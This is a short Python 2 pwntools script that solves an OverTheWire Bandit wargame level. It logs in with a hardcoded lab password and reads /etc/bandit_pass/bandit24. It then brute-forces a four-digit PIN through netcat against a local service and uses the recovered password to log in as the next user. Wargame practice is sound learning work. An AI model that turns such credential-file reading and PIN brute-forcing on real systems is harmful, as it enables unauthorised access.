#!/bin/python2

import pwn
import re

user = "bandit24"
host = "bandit.labs.overthewire.org"
passwd = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
port = 2220

cmd = """  
mkdir /tmp/mybandit25;
for i in {0000..9999}; do 
    echo "$(cat /etc/bandit_pass/bandit24) $i" >> /tmp/mybandit25/crunch 2>/dev/null; 
done && 

cat /tmp/mybandit25/crunch | 
nc localhost 30002 | 
egrep -v "Wrong|Fail|I am|Correct|Exiting" | 
egrep -o "[A-Za-z0-9]{32}" &&
rm -Rf /tmp/mybandit25
"""

shell = pwn.ssh(user, host, port, passwd)
new_passwd = shell.run(cmd).recvline_regex(re.compile("[a-zA-Z0-9]{32}"))

shell.close()

shell = pwn.ssh("bandit25", host, port, new_passwd)

print shell.ls()
